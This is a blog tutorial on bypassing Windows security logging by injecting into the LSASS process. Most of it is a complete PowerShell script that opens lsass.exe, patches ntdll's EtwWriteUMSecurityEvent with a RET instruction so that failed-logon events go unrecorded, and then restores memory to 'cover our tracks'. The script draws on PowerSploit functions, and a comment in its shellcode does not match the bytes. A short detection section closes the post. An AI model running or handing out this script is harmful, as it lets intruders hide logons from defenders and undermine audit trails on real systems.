---
title: Bypass security log event using process memory injection
date: 2024-12-2
tags: 
- windows exploitation
- process injection
category: 
- reverse
- windows
---

Process injection is an exploitation technique that allows a user to modify the memory of a process. By having access to the memory of a process, the user is able to change its initial behavior and thus make it do things that were not originally planned.
There are a plethora of techniques for performing injection processes: dll injection, hollowing process, doppelgänging process... Here, we are going to focus on a fairly classic injection technique in a process using powershell.

To start with, let's explain how the windows api works as well as the authentication mechanism under windows.


# The Windows API
The Windows API is Microsoft’s core set of APIs, allowing developers to create code that interacts with functionality provided by the windows operating system. Thus with access to API-based functions, we can create code more easily and efficiently, and get rid of the headers necessary in other programming languages. This makes it possible to create scripts in a clearer and more elegant way.

When we try to log into a user account, if the credentials are incorrect, we may see the Logon Failure in the event viewer : Security Section, Event ID 4625.

![](/images/trigger-lsass.png)


# Interactive logon
Winlogon is the process responsible for managing security-related user interactions. It coordinates logon, starts the user’s first process at logon, and handles logoff. It also manages various other operations relevant to security. 
The winlogon process must ensure that operations relevant to security aren’t visible to any other active processes. For example, Winlogon is the only process that intercepts logon requests from the keyboard (these are sent through an RPC message from Win32k.sys). 
	
After obtaining a username and password from credential providers (listed in HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers), winlogon calls Lsass to authenticate the user attempting to log on. 


# Use case: bypass security events sent by lsass
## How the enforcement security policy works in windows
Lsass : per Wikipedia, ‘LSASS is a process that is responsible for enforcing the security policy on the system. It verifies users logging on to a windows computer or server, handles password changes, and creates access tokens. It also writes to the windows security log’. Moreover, it creates security tokens for SAM, AD, and NETLOGON. To do this, Lsass.exe will include dlls such as ntdll.dll and use functions found in them. 
![](https://learn.microsoft.com/en-us/windows-server/security/media/credentials-processes-in-windows-authentication/authn_lsa_architecture_client.png)

Basically, it’s the security process system, which keeps track of the security policies and the accounts that are in effect on a computer system. He is based on Lsa which is the Local Security Administrator, a protected system process that authenticates and logs users on to the local computer. 

LSA calls the MSV1_0 authentication package to process GINA-enforced logon data for the WinLogon logon process. The MSV1_0 package performs the SAM database to determine if the logon data belongs to a valid security principle and then returns the result of the logon attempt to the LSA.


By reversing ntdll.dll, we realize that to write in the security logs, lsass.exe will use a function called EtwWriteUMSecurityEvent which is based on the return value sent by the NTTraceEvent function to define the event.
In summary: NTTraceEvent checks whether there was a system error or not. If yes, he will return the system error code, then EtwWriteUMSecurityEvent will use this code with the RtlNtStatusToDosError function to return into the RAX registry the specified NTSTATUS code to its equivalent system error code.

## Exploitation
The goal of a process injection is to inject a piece of code into the process memory address space of another process, give this memory address space execution permissions, and then execute the injected code. 

To achieve this goal, the following steps are required : 
- Identify the target process id
- Receive a handle for the targeted process to access its process address space
- Identify the target memory process in which to inject the code
- Perform code injection into the memory address space of the targeted process.
- Finally, execute the injected code

Now that we have this high-level perspective into how process injection is performed, let’s turn to an explanation of windows API functions

## Writing the script step by step

### Step 1: find the function address in the memory
Here, we use an implemented function of the win32api called ‘Get-ProcAddr’.
This function returns an address of the DLL loaded into the process. Considering that ntdll.dll is mapped to the same address for all Windows processes (concept of shared libraries), this function can be used to obtain the address of the API to be loaded in the remote process.

### Step 2: open the process and write our shellcode
Using OpenProcess and providing the target process ID as one of its parameters, the injector process receives a handle to the remote process. 
WriteProcessMemory function performs the actual injection, inserting the malicious payload into the target process.

### Step 3: writing and injecting the payload
The payload is quite simple : ‘0xc3’. In order to bypass the function, the injecting function writes the ‘RETN’ instruction in the memory space address of the ETwWriteSecurityEvent function.

Be careful to implement the shellcode in absolute address x64, otherwise the event viewer sends a 521 error (Unable to log event to security log).

### Step 4: trigger lsass to verify if the shellcode works well
To do that, we take fake credentials and we try to open a random process.
```ps
function Local:Trigger-Lsass
{
    $username = "Administrator"
    $password = "F4k3P4$$w0rd"

    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
    Start-Process notepad.exe -Credential $credential
}
```

Here, we try to open a notepad process. Once run, the program will trigger Lsass and we won’t be able to see logon failure in the event viewer.

### Bonus step: cover our tracks
Once the memory of the Lsass process is changed, all future processes that want to use ntdll.dll will see the function's new behavior. Here, we read and save the memory value of EtwWriteUMSecurityEvent before we modify it, to be able to put it back in its initial state after our passage.

To do this we need a process, a memory address in the process and the number of bytes to read. Then we return the read buffer.

# Detection

- Static-based detection : using yara tool to detect malicious software statically and dynamically at the memory level. First, we can seek common Windows API function calls that are commonly used to product process injection (such as OpenProcess, WriteProcessMemory, VirtualAlloc, …)

- Flow-based detection : understanding the preceding applied flow, identifying parameters used in each function and checking their order or flow of execution. As seen earlier, process injection happens in 2 main phases : receiving a handle to the target process and injecting the malicious payload in the targeted process. By trying to open a handle to a critical process, an antivirus can detect it based on the flow of used windows API functions. For example : the use of specific parameters such as the PROCESS_ALL_ACCESS flag in the OpenProcess function, then the use of WriteProcessMemory function.

- Behavior-based detection : used to detect anomalous or suspicious activities. 



# Conclusion
The windows API is as powerful as it is dangerous. Its action perimeter increases the risks on assets and expands the attack surface available to attackers. Moreover, the logs are of great importance to enable incident detection and response. Which makes it a prey of choice for all attackers wishing to hide their trace, or to slow down further investigations.

# Script final
```ps
function Invoke-BPEtwSecurityEvent {
    <#
    .SYNOPSIS
    
    Many technics or functions are directly inspired by PowerSploit offensive scripts.
    
    .DESCRIPTION
    
    Load shellcode into the lsass process in order to bypass security logs
    
    #>
    
        #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
        function Local:Get-DelegateType
        {
            Param
            (
                [OutputType([Type])]
    
                [Parameter( Position = 0)]
                [Type[]]
                $Parameters = (New-Object Type[](0)),
    
                [Parameter( Position = 1 )]
                [Type]
                $ReturnType = [Void]
            )
    
            $Domain = [AppDomain]::CurrentDomain
            $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
            $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
            $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
            $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
            $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
            $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
            $MethodBuilder.SetImplementationFlags('Runtime, Managed')
    
            Write-Output $TypeBuilder.CreateType()
        }
    
        #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
        function Local:Get-ProcAddress
        {
            Param
            (
                [OutputType([IntPtr])]
                [Parameter( Position = 0, Mandatory = $True )]
                [String]
                $Module,
                [Parameter( Position = 1, Mandatory = $True )]
                [String]
                $Procedure
            )
            # Get a reference to System.dll in the GAC
            $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
            $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
            
            # Get a reference to the GetModuleHandle and GetProcAddress methods
            $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
            
            # Get a handle to the module specified
            $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
            $tmpPtr = New-Object IntPtr
            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    
            # Return the address of the function
            Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
        }
    
        # Open lsass process and inject the shellcode into EtwWriteUMSecurityEvent function
        function Local:Inject-MemoryProc {
            Param (
                # The process to corrupt
                [Parameter()]
                [ValidateNotNullOrEmpty()]
                [System.IntPtr]
                $hProcess,
    
                # The address where inject the data
                [Parameter()]
                [ValidateNotNullOrEmpty()]
                [System.IntPtr]
                $lpBaseAddress,
    
                # The shellcode
                [Parameter()]
                [ValidateNotNullOrEmpty()]
                [Byte[]]
                $lpBuffer
            )
    
            $WriteProcess = $WriteProcessMemory.Invoke($hProcess, $lpBaseAddress, $lpBuffer, $lpBuffer.Length,[ref] 0)
            if($WriteProcess -eq 0){
                Write-Output "Injection failed!"
            } else {
                Write-Output "Injection successful!"
            }
        }
    
        # Get the value of the memory before changing
        function Local:Get-MemoryValue
        {
            Param (
                [Parameter()]
                [ValidateNotNullOrEmpty()]
                [System.IntPtr]
                $ProcessId,
                [Parameter()]
                [ValidateNotNullOrEmpty()]
                [System.IntPtr]
                $lpBaseAddress,
                [Parameter()]
                [ValidateNotNullOrEmpty()]
                [Int]
                $Size
            )
    
            $lpBuffer = New-Object byte[]($Size)
            [int32]$NumberOfBytesRead = 0
            
            $RetValue = $ReadProcessMemory.Invoke($ProcessId, $lpBaseAddress, $lpBuffer, $lpBuffer.Length, [ref]$NumberOfBytesRead)
    
            Write-Output $lpBuffer
        }
    
        # Build and return the shellcode
        function Local:Get-Shellcode 
        {
            $CallStub = New-Object Byte[](0)
            $CallStub += 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 # MOV RAX, 1
            $CallStub += 0xc3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 # RETN
    
            Write-Output $CallStub
        }
    
        # Raise an error to verify the operation of the script
        function Local:Trigger-Lsass
        {
            # Set fake credentials
            $username = 'Administrator'
            $password = 'F4k3P$$w0rdFr0mH4ck3r'
    
            $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
            $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
    
            # Start a process with fake credentials
            Start-Process notepad.exe -Credential $credential
        }
    
        # Get lsass id
        $ProcId = Get-Process -ProcessName lsass | Select -expand Id
    
        # Get OpenProcess address
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
    
        # Get WriteProcessMemory address
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
    
        # Get ReadProcessMemory address
        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
    
        # Get EtwWriteUMSecurityEvent address
        $OpenProcessAddr = Get-ProcAddress "ntdll.dll" "EtwWriteUMSecurityEvent"
    
        if($OpenProcessAddr -eq 0){
            exit(1)
        } else {
            Write-Output "Memory addr found at : $('0x{0:x}' -f [int64]$OpenProcessAddr)"
            $lpBaseAddress = [int64]$OpenProcessAddr
            $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
        }
        
        $lpBufferEtw = Get-MemoryValue $hProcess $lpBaseAddress 170
        $Shellcode = Get-Shellcode 
    
        Write-Output "Injection of the shellcode at : $($lpBaseAddress)..."
        Inject-MemoryProc -hProcess $hProcess -lpBaseAddress $lpBaseAddress -lpBuffer $Shellcode
    
        Write-Output "Trigger the Security Event ..."
        Trigger-Lsass
    
        Write-Output "Rewrite the memory ..."
        Inject-MemoryProc -hProcess $hProcess -lpBaseAddress $lpBaseAddress -lpBuffer $lpBufferEtw
    
        Write-Host "Press any key to continue..."
        $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
    Invoke-BPEtwSecurityEvent
```
